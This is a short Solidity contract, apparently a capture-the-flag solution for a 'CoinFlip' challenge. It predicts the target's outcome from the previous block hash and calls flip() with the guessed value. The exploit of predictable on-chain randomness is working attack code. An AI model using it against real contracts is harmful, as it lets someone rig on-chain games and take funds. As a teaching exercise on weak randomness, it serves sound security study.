// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {

    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    address private contractAddress;

    constructor(address _contractAddress) {
	    contractAddress = _contractAddress;
    }

    function hackContract() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = blockValue / FACTOR == 1 ? true : false;
        CoinFlip(contractAddress).flip(guess);
    }
}
